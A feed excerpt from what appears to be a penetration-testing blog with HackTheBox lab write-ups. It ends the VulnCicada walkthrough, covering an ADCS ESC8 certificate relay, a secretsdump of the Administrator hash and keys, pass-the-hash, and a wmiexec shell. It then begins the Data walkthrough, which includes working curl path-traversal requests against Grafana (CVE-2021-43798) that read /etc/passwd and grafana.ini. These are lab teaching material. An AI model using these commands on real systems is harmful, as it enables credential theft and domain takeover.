http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK" [*] Authenticating against http://dc-jpq225.cicada.vl as / SUCCEED [*] Requesting certificate for '\\' based on the template 'DomainController' [*] HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK" [*] Certificate issued with request ID 95 [*] Retrieving certificate for request ID: 95 [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=95 "HTTP/1.1 200 OK" [*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl' [*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000' [*] Saving certificate and private key to 'dc-jpq225.pfx' [*] Wrote certificate and private key to 'dc-jpq225.pfx' [*] Exiting... </span></code></pre></div></div> <p>With the certificate I can authenticate as the computer account:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>certipy auth <span class="nt">-pfx</span> dc-jpq225.pfx <span class="nt">-dc-ip</span> 10.129.234.48 <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Certificate identities: [*] SAN DNS Host Name: 'DC-JPQ225.cicada.vl' [*] Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000' [*] Using principal: 'dc-jpq225$@cicada.vl' [*] Trying to get TGT... [*] Got TGT [*] Saving credential cache to 'dc-jpq225.ccache' [*] Wrote credential cache to 'dc-jpq225.ccache' [*] Trying to retrieve NT hash for 'dc-jpq225$' [*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3 </span></code></pre></div></div> <p>This returns both a TGT and the NTLM for the account.</p> <h2 id="shell-as-administrator">Shell as Administrator</h2> <h3 id="dump-hashes">Dump Hashes</h3> <p>The machine account cannot get a shell directly, but this TGT can be used to dump hashes from the DC:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>dc-jpq225.ccache secretsdump.py <span class="nt">-k</span> <span class="nt">-no-pass</span> cicada.vl/dc-jpq225<span class="se">\$</span>@dc-jpq225.cicada.vl <span class="nt">-just-dc-user</span> administrator <span class="go">/home/oxdf/.local/share/uv/tools/impacket/lib/python3.12/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81. import pkg_resources Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4 Administrator:des-cbc-md5:fd2a29621f3e7604 [*] Cleaning up... </span></code></pre></div></div> <p>The hash is valid:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb dc-jpq225.cicada.vl <span class="nt">-u</span> administrator <span class="nt">-H</span> 85a0da53871a9d56b6cd05deda3a5e87 <span class="nt">-k</span> <span class="netexec-protocol">SMB </span><span class="go"> dc-jpq225.cicada.vl 445 dc-jpq225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:dc-jpq225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> dc-jpq225.cicada.vl 445 dc-jpq225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\administrator:85a0da53871a9d56b6cd05deda3a5e87 </span><span class="netexec-pwned">(Pwn3d!)</span><span class="go"> </span></code></pre></div></div> <h3 id="shell">Shell</h3> <p>A quick way to get a shell from here is <code class="language-plaintext highlighter-rouge">wmiexec</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>wmiexec.py cicada.vl/administrator@dc-jpq225.cicada.vl <span class="nt">-k</span> <span class="nt">-hashes</span> :85a0da53871a9d56b6cd05deda3a5e87 <span class="go">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] CCache file is not found. Skipping... [*] SMBv3.0 dialect used [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\&gt;whoami cicada\administrator </span></code></pre></div></div> <p>And grab the flags:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\users\administrator\desktop&gt;</span><span class="nb">type </span>user.txt <span class="go">c6a8fc2e************************ </span><span class="gp">C:\users\administrator\desktop&gt;</span><span class="nb">type </span>root.txt <span class="go">65d0019f************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-vulncicada"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-vulncicada"/>
<category term="vulnlab"/>
<category term="nmap"/>
<category term="windows"/>
<category term="active-directory"/>
<category term="feroxbuster"/>
<category term="netexec"/>
<category term="nfs"/>
<category term="certenroll"/>
<category term="adcs"/>
<category term="certipy"/>
<category term="esc8"/>
<category term="certipy-relay"/>
<category term="netexec-coerce-plus"/>
<category term="petitpotam"/>
<category term="secretsdump"/>
<category term="wmiexec"/>
<summary type="html">
<![CDATA[ I’ll find an open NFS share on VulnCicada, and exfil two images. One of them has a password on a sticknote, which I’ll use to get authenticated to the domain. From there, I’ll enumerate ADCS and find the DC vulnerable to ESC8. I’ll show how to do this attack from Linux, creating a malicious DNS record that points the DC back to my host, abusing a serialized empty string. Then I’ll use PetitPotam to coerce the DC to authenticate to me, where I’ll use certipy relay to get a TGT as the machine account. I’ll use that account to dump hashes for the domain, and get a shell as administrator. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/vulncicada-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/vulncicada-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Data</title>
<link href="https://0xdf.gitlab.io/2025/07/01/htb-data.html" rel="alternate" type="text/html" title="HTB: Data"/>
<published>2025-07-01T09:00:00+00:00</published>
<updated>2025-07-01T09:00:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/07/01/htb-data</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/07/01/htb-data.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/data-cover.webp" /> <img loading="lazy" src="/img/data-cover.png" alt="Data" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Data is a pretty straight forward easy box that starts with a Grafana instance. I’ll abuse an unauthenticated directory traversal / file read vulnerability to leak the SQLite file used by Grafana. I’ll crack a user hash and find it’s a shared password with an account on the system. For root, I’ll abuse a sudo rule that allows for running docker exec. Inside the container, I’ll mount the host file system and leverage that into a shell.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/673 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/data" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Data</a> <a href="https://hackthebox.com/machines/data" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-data.webp" /> <img src="/icons/box-data.png" alt="Data" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/data" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right">01 Jul 2025</td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">01 Jul 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td>Creator</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" target="_blank" rel="noopener"><img alt="xct" src="https://www.hackthebox.com/badge/image/13569" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> xct</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (3000):</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="700"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">-vvv</span> <span class="nt">-min-rate</span> 10000 10.129.234.47 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 01:04 UTC ...[snip]... Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 3000/tcp open ppp syn-ack ttl 62 Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p</span> 22,3000 <span class="nt">-sCV</span> 10.129.234.47 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-16 01:06 UTC Nmap scan report for 10.129.234.47 Host is up (0.090s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA) | 256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA) |_ 256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519) 3000/tcp open ppp? | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Mon, 16 Jun 2025 01:19:20 GMT | Content-Length: 29 | href="/login"&gt;Found&lt;/a&gt;. | GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Cache-Control: no-cache | Content-Type: text/html; charset=utf-8 | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Mon, 16 Jun 2025 01:18:44 GMT | Content-Length: 29 | href="/login"&gt;Found&lt;/a&gt;. | HTTPOptions: | HTTP/1.0 302 Found | Cache-Control: no-cache | Expires: -1 | Location: /login | Pragma: no-cache | Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax | X-Content-Type-Options: nosniff | X-Frame-Options: deny | X-Xss-Protection: 1; mode=block | Date: Mon, 16 Jun 2025 01:18:50 GMT |_ Content-Length: 0 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.94SVN%I=7%D=6/16%Time=684F6E06%P=x86_64-pc-linux-gnu%r SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba SF:d\x20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Con SF:trol:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nEx SF:pires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cooki SF:e:\x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Con SF:tent-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Prot SF:ection:\x201;\x20mode=block\r\nDate:\x20Mon,\x2016\x20Jun\x202025\x2001 SF::18:44\x20GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\"/login\"&gt;Fou SF:nd&lt;/a&gt;\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4 SF:00\x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\n SF:Cache-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\n SF:Pragma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20Ht SF:tpOnly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Fram SF:e-Options:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x2 SF:0Mon,\x2016\x20Jun\x202025\x2001:18:50\x20GMT\r\nContent-Length:\x200\r SF:\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConten SF:t-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n SF:400\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20 SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection: SF:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTT SF:P/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20char SF:set=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSS SF:essionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2 SF:0Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4 SF:00\x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Fou SF:nd\r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20char SF:set=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cac SF:he\r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\. SF:txt%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type- SF:Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x2 SF:01;\x20mode=block\r\nDate:\x20Mon,\x2016\x20Jun\x202025\x2001:19:20\x20 SF:GMT\r\nContent-Length:\x2029\r\n\r\n&lt;a\x20href=\"/login\"&gt;Found&lt;/a&gt;\.\n SF:\n"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 102.51 seconds </span></code></pre></div></div> <p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH</a> version, the host is likely running Ubuntu 18.04 bionic.</p> <p><code class="language-plaintext highlighter-rouge">nmap</code> is showing one additional hop to get to the webserver. <code class="language-plaintext highlighter-rouge">lft</code> confirms this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.234.47:22 <span class="go">Tracing ......T TTL LFT trace to 10.129.234.47:22/tcp 1 10.10.14.1 89.6ms 2 [target open] 10.129.234.47:22 89.6ms </span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>lft 10.129.234.47:3000 <span class="go">Tracing ......T TTL LFT trace to 10.129.234.47:3000/tcp 1 10.10.14.1 89.6ms 2 10.129.234.47 89.8ms 3 [target open] 10.129.234.47:3000 89.3ms </span></code></pre></div></div> <p>That implies the webserver is running in a container.</p> <h3 id="website---tcp-3000">Website - TCP 3000</h3> <h4 id="site">Site</h4> <p>The website is an instance of Grafana:</p> <picture> <source type="image/webp" srcset="/img/image-20250615210722048.webp" /> <img loading="lazy" src="/img/image-20250615210722048.png" alt="image-20250615210722048" class="include_image " /> </picture> <h4 id="tech-stack">Tech Stack</h4> <p>The login page footer gives the version of v8.0.0. The HTTP response headers don’t reveal much else:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">302</span> <span class="ne">Found</span> <span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-cache</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span> <span class="na">Expires</span><span class="p">:</span> <span class="s">-1</span> <span class="na">Location</span><span class="p">:</span> <span class="s">/login</span> <span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span> <span class="na">Set-Cookie</span><span class="p">:</span> <span class="s">redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax</span> <span class="na">X-Content-Type-Options</span><span class="p">:</span> <span class="s">nosniff</span> <span class="na">X-Frame-Options</span><span class="p">:</span> <span class="s">deny</span> <span class="na">X-Xss-Protection</span><span class="p">:</span> <span class="s">1; mode=block</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Mon, 16 Jun 2025 01:22:28 GMT</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">29</span> </code></pre></div></div> <p>Grafana is a TypeScript front-end with a Go backend, as seen on it’s <a href="https://github.com/grafana/grafana">GitHub page</a>.</p> <p>There is no 404 page, as it just redirects to <code class="language-plaintext highlighter-rouge">/login</code>. I’ll skip the directory brute force as the routes in Grafana are documented.</p> <h2 id="shell-as-boris">Shell as boris</h2> <h3 id="exfil-grafana-db">Exfil Grafana DB</h3> <h4 id="cve-2021-43798-background">CVE-2021-43798 Background</h4> <p>Searching for “grafana v8.0.0 cve” returns references to a couple CVEs, including references to CVE-2021-43798:</p> <picture> <source type="image/webp" srcset="/img/image-20250616065525985.webp" /> <img loading="lazy" src="/img/image-20250616065525985.png" alt="image-20250616065525985" class="include_image " /> </picture> <p><a href="https://nvd.nist.gov/vuln/detail/cve-2021-43798">CVE-2021-43798</a> is described by Nist as:</p> <blockquote> <p>Grafana is an open-source platform for monitoring and observability. Grafana versions 8.0.0-beta1 through 8.3.0 (except for patched versions) iss vulnerable to directory traversal, allowing access to local files. The vulnerable URL path is: <code class="language-plaintext highlighter-rouge">&lt;grafana_host_url&gt;/public/plugins/&lt;plugin ID&gt;/</code>, where is the plugin ID for any installed plugin. At no time has Grafana Cloud been vulnerable. Users are advised to upgrade to patched versions 8.0.7, 8.1.8, 8.2.7, or 8.3.1. The GitHub Security Advisory contains more information about vulnerable URL paths, mitigation, and the disclosure timeline.</p> </blockquote> <p>I’ve exploited this vulnerability before on Ambassador, and in that post I <a href="/2023/01/28/htb-ambassador.html#exploit-analysis">walk through a POC exploit</a> to show what it’s doing. The plugins path is vulnerable to directory traversal leading to file read in the path <code class="language-plaintext highlighter-rouge">/public/plugins/&lt;plugin name&gt;/</code>.</p> <h4 id="cve-2021-43798-poc">CVE-2021-43798 POC</h4> <p>To test this, I’ll try to read <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">--path-as-is</span> http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/passwd <span class="go">root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin </span></code></pre></div></div> <p>It works.</p> <h4 id="enumerate-grafana">Enumerate Grafana</h4> <p>Just like in Ambassador, I’ll read the <code class="language-plaintext highlighter-rouge">grafana.ini</code> file:</p> <div class="language-console code-collapse highlighter-rouge" data-trunc="300"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$ </span>curl <span class="nt">--path-as-is</span> http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini <span class="c">##################### Grafana Configuration Example ##################### # # Everything has defaults so you only need to uncomment things you want to # change </span> <span class="c"># possible values : production, development ;app_mode = production </span> <span class="c"># instance name, defaults to HOSTNAME environment variable value or hostname if HOSTNAME var is empty ;instance_name = ${HOSTNAME} </span> <span class="c">#################################### Paths #################################### </span><span class="nn">[paths]</span> <span class="c"># Path to where grafana can store temp files, sessions, and the sqlite3 db (if that is used) ;data = /var/lib/grafana </span> <span class="c"># Temporary files in `data` directory older than given duration will be removed ;temp_data_lifetime = 24h </span> <span class="c"># Directory where grafana can store logs ;logs = /var/log/grafana </span> <span class="c"># Directory where grafana will automatically scan and look for plugins ;plugins = /var/lib/grafana/plugins </span> <span class="c"># folder that contains provisioning config files that grafana will apply on startup and while running. ;provisioning = conf/provisioning </span> <span class="c">#################################### Server #################################### </span><span class="nn">[server]</span> <span class="c"># Protocol (http, https, h2, socket) ;protocol = http </span> <span class="c"># The ip address to bind to, empty will bind to all interfaces ;http_addr = </span> <span class="c"># The http port to use ;http_port = 3000 </span> <span class="c"># The public facing domain name used to access grafana from a browser ;domain = localhost </span> <span class="c"># Redirect to correct domain if host header does not match domain # Prevents DNS rebinding attacks ;enforce_domain = false </span> <span class="c"># The full public facing url you use in browser, used for redirects and emails # If you use reverse proxy and sub path specify full url (with sub path) ;root_url = %(protocol)s://%(domain)s:%(http_port)s/ </span> <span class="c"># Serve Grafana from subpath specified in `root_url` setting. By default it is set to `false` for compatibility reasons. ;serve_from_sub_path = false </span> <span class="c"># Log web requests ;router_logging = false </span> <span class="c"># the path relative working path ;static_root_path = public </span> <span class="c"># enable gzip ;enable_gzip = false </span> <span class="c"># https certs &amp; key file ;cert_file = ;cert_key = </span> <span class="c"># Unix socket path ;socket = </span> <span class="c"># CDN Url ;cdn_url = </span> <span class="c"># Sets the maximum time using a duration format (5s/5m/5ms) before timing out read of an incoming request and closing idle connections. # `0` means there is no timeout for reading the request. ;read_timeout = 0 </span> <span class="c">#################################### Database #################################### </span><span class="nn">[database]</span> <span class="c"># You can configure the database connection by specifying type, host, name, user and password # as separate properties or as on string using the url properties. </span> <span class="c"># Either "mysql", "postgres" or "sqlite3", it's your choice ;type = sqlite3 ;host = 127.0.0.1:3306 ;name = grafana ;user = root # If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;""" ;password = </span> <span class="c"># Use either URL or the previous fields to configure the database # Example: mysql://user:secret@host:port/database ;url = </span> <span class="c"># For "postgres" only, either "disable", "require" or "verify-full" ;ssl_mode = disable </span> <span class="c"># Database drivers may support different transaction isolation levels. # Currently, only "mysql" driver supports isolation levels. # If the value is empty - driver's default isolation level is applied. # For "mysql" use "READ-UNCOMMITTED", "READ-COMMITTED", "REPEATABLE-READ" or "SERIALIZABLE". ;isolation_level = </span> <span class="c">;ca_cert_path = ;client_key_path = ;client_cert_path = ;server_cert_name = </span> <span class="c"># For "sqlite3" only, path relative to data_path setting ;path = grafana.db </span> <span class="c"># Max idle conn setting default is 2 ;max_idle_conn = 2 </span> <span class="c"># Max conn setting default is 0 (mean not set) ;max_open_conn = </span> <span class="c"># Connection Max Lifetime default is 14400 (means 14400 seconds or 4 hours) ;conn_max_lifetime = 14400 </span> <span class="c"># Set to true to log the sql calls and execution times. ;log_queries = </span> <span class="c"># For "sqlite3" only. cache mode setting used for connecting to the database. (private, shared) ;cache_mode = private </span> <span class="c">################################### Data sources ######################### </span><span class="nn">[datasources]</span> <span class="c"># Upper limit of data sources that Grafana will return. This limit is a temporary configuration and it will be deprecated when pagination will be introduced on the list data sources API. ;datasource_limit = 5000 </span> <span class="c">#################################### Cache server ############################# </span><span class="nn">[remote_cache]</span> <span class="c"># Either "redis", "memcached" or "database" default is "database" ;type = database </span> <span class="c"># cache connectionstring options # database: will use Grafana primary database. # redis: config like redis server e.g. `addr=127.0.0.1:6379,pool_size=100,db=0,ssl=false`. Only addr is required. ssl may be 'true', 'false', or 'insecure'. # memcache: 127.0.0.1:11211 ;connstr = </span> <span class="c">#################################### Data proxy ########################### </span><span class="nn">[dataproxy]</span> <span class="c"># This enables data proxy logging, default is false ;logging = false </span> <span class="c"># How long the data proxy waits to read the headers of the response before timing out, default is 30 seconds. # This setting also applies to core backend HTTP data sources where query requests use an HTTP client with timeout set. ;timeout = 30 </span> <span class="c"># How long the data proxy waits to establish a TCP connection before timing out, default is 10 seconds. ;dialTimeout = 10 </span> <span class="c"># How many seconds the data proxy waits before sending a keepalive probe request. ;keep_alive_seconds = 30 </span> <span class="c"># How many seconds the data proxy waits for a successful TLS Handshake before timing out. ;tls_handshake_timeout_seconds = 10 </span> <span class="c"># How many seconds the data proxy will wait for a server's first response headers after # fully writing the request headers if the request has an "Expect: 100-continue" # header. A value of 0 will result in the body being sent immediately, without # waiting for the server to approve. ;expect_continue_timeout_seconds = 1 </span> <span class="c"># The maximum number of idle connections that Grafana will keep alive. ;max_idle_connections = 100 </span> <span class="c"># The maximum number of idle connections per host that Grafana will keep alive. ;max_idle_connections_per_host = 2 </span> <span class="c"># How many seconds the data proxy keeps an idle connection open before timing out. ;idle_conn_timeout_seconds = 90 </span> <span class="c"># If enabled and user is not anonymous, data proxy will add X-Grafana-User header with username into the request, default is false. ;send_user_header = false </span> <span class="c">#################################### Analytics #################################### </span><span class="nn">[analytics]</span> <span class="c"># Server reporting, sends usage counters to stats.grafana.org every 24 hours. # No ip addresses are being tracked, only simple counters to track # running instances, dashboard and error counts. It is very helpful to us. # Change this option to false to disable reporting. ;reporting_enabled = true </span> <span class="c"># The name of the distributor of the Grafana instance. Ex hosted-grafana, grafana-labs ;reporting_distributor = grafana-labs </span> <span class="c"># Set to false to disable all checks to https://grafana.net # for new versions (grafana itself and plugins), check is used # in some UI views to notify that grafana or plugin update exists # This option does not cause any auto updates, nor send any information # only a GET request to http://grafana.com to get latest versions ;check_for_updates = true </span> <span class="c"># Google Analytics universal tracking code, only enabled if you specify an id here ;google_analytics_ua_id = </span> <span class="c"># Google Tag Manager ID, only enabled if you specify an id here ;google_tag_manager_id = </span> <span class="c">#################################### Security #################################### </span><span class="nn">[security]</span> <span class="c"># disable creation of admin user on first start of grafana ;disable_initial_admin_creation = false </span> <span class="c"># default admin user, created on startup ;admin_user = admin </span> <span class="c"># default admin password, can be changed before first start of grafana, or in profile settings ;admin_password = admin </span> <span class="c"># used for signing ;secret_key = SW2YcwTIb9zpOOhoPsMm </span> <span class="c"># disable gravatar profile images ;disable_gravatar = false </span> <span class="c"># data source proxy whitelist (ip_or_domain:port separated by spaces) ;data_source_proxy_whitelist = </span> <span class="c"># disable protection against brute force login attempts 